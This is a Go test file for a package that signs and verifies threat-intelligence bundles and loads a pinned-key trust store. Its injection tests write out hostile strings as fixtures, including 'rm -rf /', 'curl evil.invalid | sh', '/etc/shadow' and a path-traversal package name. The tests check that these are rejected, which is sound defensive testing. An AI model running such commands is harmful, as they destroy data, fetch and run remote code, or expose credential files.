package intel

import (
	"bytes"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRecordValidationBoundsAndDuplicates(t *testing.T) {
	_, privateKey := testKey(6)
	base := testBundle(12)

	tests := []struct {
		name    string
		mutate  func(*Bundle)
		limits  Limits
		wantErr error
	}{
		{
			name: "duplicate normalized hash",
			mutate: func(bundle *Bundle) {
				bundle.Records = append(bundle.Records, Record{
					Type: RecordMaliciousSHA256,
					MaliciousSHA256: &MaliciousSHA256Record{
						SHA256: strings.Repeat("a", 64),
					},
				})
			},
			wantErr: ErrDuplicateRecord,
		},
		{
			name: "duplicate detector id",
			mutate: func(bundle *Bundle) {
				bundle.Records = append(bundle.Records, Record{
					Type: RecordSecretPattern,
					SecretPattern: &SecretDetectorPatternRecord{
						DetectorID: "example-api-key", Pattern: `token=[a-z]+`,
					},
				})
			},
			wantErr: ErrDuplicateRecord,
		},
		{
			name: "invalid regex",
			mutate: func(bundle *Bundle) {
				bundle.Records[3].SecretPattern.Pattern = `([`
			},
			wantErr: ErrInvalidRecord,
		},
		{
			name: "empty matching regex",
			mutate: func(bundle *Bundle) {
				bundle.Records[3].SecretPattern.Pattern = `a*`
			},
			wantErr: ErrInvalidRecord,
		},
		{
			name: "pattern bound",
			mutate: func(bundle *Bundle) {
				bundle.Records[3].SecretPattern.Pattern = strings.Repeat("x", 65)
			},
			limits: Limits{
				MaxBundleBytes: 1 << 20, MaxRecords: 100,
				MaxRecordBytes: 256, MaxPatternBytes: 64,
			},
			wantErr: ErrInvalidRecord,
		},
		{
			name: "record bound",
			mutate: func(bundle *Bundle) {
				bundle.Records[3].SecretPattern.Pattern = strings.Repeat("x", 100)
			},
			limits: Limits{
				MaxBundleBytes: 1 << 20, MaxRecords: 100,
				MaxRecordBytes: 80, MaxPatternBytes: 64,
			},
			wantErr: ErrInvalidRecord,
		},
		{
			name:   "record count",
			mutate: func(_ *Bundle) {},
			limits: Limits{
				MaxBundleBytes: 1 << 20, MaxRecords: 3,
				MaxRecordBytes: 1 << 10, MaxPatternBytes: 512,
			},
			wantErr: ErrTooManyRecords,
		},
		{
			name: "path traversal package",
			mutate: func(bundle *Bundle) {
				bundle.Records[2].VulnerablePackage.Package = "../../etc/passwd"
			},
			wantErr: ErrInvalidRecord,
		},
		{
			name: "duplicate version constraint",
			mutate: func(bundle *Bundle) {
				constraint := bundle.Records[2].VulnerablePackage.Constraints[0]
				bundle.Records[2].VulnerablePackage.Constraints =
					append(bundle.Records[2].VulnerablePackage.Constraints, constraint)
			},
			wantErr: ErrInvalidRecord,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			bundle := base
			bundle.Records = cloneRecords(base.Records)
			test.mutate(&bundle)
			_, _, err := Sign(bundle, "release-2026", privateKey, test.limits)
			if !errors.Is(err, test.wantErr) {
				t.Fatalf("Sign() error = %v, want %v", err, test.wantErr)
			}
		})
	}
}

func cloneRecords(records []Record) []Record {
	cloned := make([]Record, len(records))
	for index, record := range records {
		cloned[index] = record
		if record.MaliciousSHA256 != nil {
			value := *record.MaliciousSHA256
			cloned[index].MaliciousSHA256 = &value
		}
		if record.RevokedSigner != nil {
			value := *record.RevokedSigner
			cloned[index].RevokedSigner = &value
		}
		if record.VulnerablePackage != nil {
			value := *record.VulnerablePackage
			value.Constraints = append([]VersionConstraint(nil), value.Constraints...)
			cloned[index].VulnerablePackage = &value
		}
		if record.SecretPattern != nil {
			value := *record.SecretPattern
			cloned[index].SecretPattern = &value
		}
	}
	return cloned
}

func TestVerifyRejectsUnknownAndCommandLikeFieldsWithoutEcho(t *testing.T) {
	publicKey, privateKey := testKey(7)
	_, encoded := signTestBundle(t, testBundle(13), privateKey)
	trust := testTrust(publicKey)

	attacks := []struct {
		name      string
		old       string
		injection string
		secret    string
	}{
		{
			name: "command", old: `"bundle_id":`,
			injection: `"command":"rm -rf /","bundle_id":`,
			secret:    "rm -rf /",
		},
		{
			name: "script", old: `"pattern":`,
			injection: `"script":"curl evil.invalid | sh","pattern":`,
			secret:    "curl evil.invalid",
		},
		{
			name: "path", old: `"detector_id":`,
			injection: `"path":"/etc/shadow","detector_id":`,
			secret:    "/etc/shadow",
		},
	}

	for _, attack := range attacks {
		t.Run(attack.name, func(t *testing.T) {
			malicious := bytes.Replace(encoded, []byte(attack.old), []byte(attack.injection), 1)
			_, err := Verify(malicious, trust, VerifyOptions{Now: testClock})
			if !errors.Is(err, ErrInvalidEncoding) {
				t.Fatalf("Verify() error = %v, want invalid encoding", err)
			}
			if strings.Contains(err.Error(), attack.secret) {
				t.Fatalf("safe error echoed attacker content: %q", err)
			}
		})
	}
}

func TestBundleAndRecordSizeLimits(t *testing.T) {
	publicKey, privateKey := testKey(8)
	_, encoded := signTestBundle(t, testBundle(14), privateKey)
	_, err := Verify(encoded, testTrust(publicKey), VerifyOptions{
		Limits: Limits{
			MaxBundleBytes: int64(len(encoded) - 1),
			MaxRecords:     100, MaxRecordBytes: 1 << 10, MaxPatternBytes: 512,
		},
		Now: testClock,
	})
	if !errors.Is(err, ErrBundleTooLarge) {
		t.Fatalf("Verify() error = %v, want bundle too large", err)
	}
}

func TestLoadTrustStoreSecurity(t *testing.T) {
	publicKey, _ := testKey(9)
	document, err := trustStoreDocument("release-2026", publicKey)
	if err != nil {
		t.Fatal(err)
	}
	directory := t.TempDir()
	path := filepath.Join(directory, "trust.json")
	if err := os.WriteFile(path, document, 0o600); err != nil {
		t.Fatal(err)
	}
	store, err := LoadTrustStore(path)
	if err != nil {
		t.Fatalf("LoadTrustStore() error = %v", err)
	}
	if pinned, ok := store.key("release-2026"); !ok || !bytes.Equal(pinned, publicKey) {
		t.Fatal("pinned public key was not loaded")
	}

	if err := os.Chmod(path, 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadTrustStore(path); !errors.Is(err, ErrInsecurePermissions) {
		t.Fatalf("LoadTrustStore(0644) error = %v", err)
	}
	if err := os.Chmod(path, 0o600); err != nil {
		t.Fatal(err)
	}

	link := filepath.Join(directory, "trust-link.json")
	if err := os.Symlink(path, link); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadTrustStore(link); !errors.Is(err, ErrUnsafeFile) {
		t.Fatalf("LoadTrustStore(symlink) error = %v", err)
	}

	unknown := bytes.Replace(document, []byte(`"keys":`), []byte(`"command":"sh","keys":`), 1)
	unknownPath := filepath.Join(directory, "unknown.json")
	if err := os.WriteFile(unknownPath, unknown, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadTrustStore(unknownPath); !errors.Is(err, ErrInvalidTrustStore) {
		t.Fatalf("LoadTrustStore(unknown field) error = %v", err)
	}
}

func TestTrustStoreRejectsDuplicateAndMalformedKeys(t *testing.T) {
	publicKey, _ := testKey(10)
	key := trustStoreKey{
		KeyID: "release-2026",
		PublicKey: func() string {
			document, _ := trustStoreDocument("release-2026", publicKey)
			var decoded trustStoreFile
			_ = decodeStrict(document, &decoded)
			return decoded.Keys[0].PublicKey
		}(),
	}
	tests := []trustStoreFile{
		{
			Schema: TrustStoreSchema, SchemaVersion: TrustStoreVersion,
			Keys: []trustStoreKey{key, key},
		},
		{
			Schema: TrustStoreSchema, SchemaVersion: TrustStoreVersion,
			Keys: []trustStoreKey{{KeyID: key.KeyID, PublicKey: "not-base64"}},
		},
		{
			Schema: TrustStoreSchema, SchemaVersion: TrustStoreVersion,
			Keys: []trustStoreKey{{
				KeyID: key.KeyID, PublicKey: nonCanonicalBase64(t, key.PublicKey),
			}},
		},
	}
	for index, document := range tests {
		encoded, err := canonicalTrustStore(document)
		if err != nil {
			t.Fatal(err)
		}
		path := filepath.Join(t.TempDir(), "trust.json")
		if err := os.WriteFile(path, encoded, 0o600); err != nil {
			t.Fatal(err)
		}
		if _, err := LoadTrustStore(path); !errors.Is(err, ErrInvalidTrustStore) {
			t.Fatalf("case %d error = %v", index, err)
		}
	}
}
